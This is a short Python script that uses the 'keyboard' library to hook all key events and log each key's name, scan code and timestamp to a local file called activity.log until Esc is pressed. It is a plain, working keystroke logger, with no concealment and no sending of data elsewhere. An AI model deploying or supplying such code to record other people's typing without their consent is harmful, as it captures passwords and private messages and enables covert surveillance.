import keyboard
import logging


def main():
    logging.basicConfig(
        filename='activity.log',  # Specify the log file name
        level=logging.INFO,  # Set the logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL)
        format='%(asctime)s - %(levelname)s - %(message)s'  # Specify the log message format
    )

    def log_pressed_key(key):
        log_message = f'{key.event_type} {key.scan_code} {key.name} {key.time}'
        logging.info(log_message)

    keyboard.hook(log_pressed_key)

    try:
        keyboard.wait('esc')
    except KeyboardInterrupt:
        pass  # Allow the program to be stopped with Ctrl+C


if __name__ == "__main__":
    main()
